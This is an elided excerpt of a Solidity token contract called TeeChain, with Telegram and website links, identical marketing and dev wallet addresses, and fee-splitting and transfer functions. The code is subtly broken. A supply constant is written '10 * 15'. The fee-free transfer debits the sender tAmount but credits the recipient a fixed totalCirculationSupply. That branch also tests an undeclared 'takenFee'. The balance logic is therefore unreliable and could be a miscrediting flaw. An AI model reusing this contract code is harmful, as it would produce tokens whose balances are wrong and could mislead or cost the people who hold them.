...
//Telegram : https://t.me/TeeChain
//Website : https://Teechain.com
...
contract TeeChain is Context, IERC20 { 
    ...
    address payable public MarketingWallet = payable(0xC35dd751F76b03EfaB3A7B2cf84F4a911906C587); 
    address payable public DevWallet = payable(0xC35dd751F76b03EfaB3A7B2cf84F4a911906C587);
    ...
    string private constant _name = "TeeChain"; 
    ...
    uint256 public totalCirculationSupply =  10 * 15;
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            uint256 tokens_to_Burn = contractTokenBalance * BurnFee / 100;
            _tTotal = _tTotal - tokens_to_Burn;
            _tOwned[BurnAddress] = _tOwned[BurnAddress] + tokens_to_Burn;
            _tOwned[address(this)] = _tOwned[address(this)] - tokens_to_Burn; 

            uint256 tokens_to_M = contractTokenBalance * MarketingFee / 100;
            uint256 tokens_to_D = contractTokenBalance * DevFee / 100;
            uint256 tokens_to_LP_Half = contractTokenBalance * LiquidityFee / 200;
            ...
            uint256 split_M = MarketingFee * 100 / (LiquidityFee + MarketingFee + DevFee);
            uint256 BNB_M = BNB_Total * split_M / 100;

            uint256 split_D = DevFee * 100 / (LiquidityFee + MarketingFee + DevFee);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if(!takenFee){
                ...
                _tOwned[sender] = _tOwned[sender]-tAmount;
                _tOwned[recipient] = _tOwned[recipient]+totalCirculationSupply;
                emit Transfer(sender, recipient, tAmount);
            }
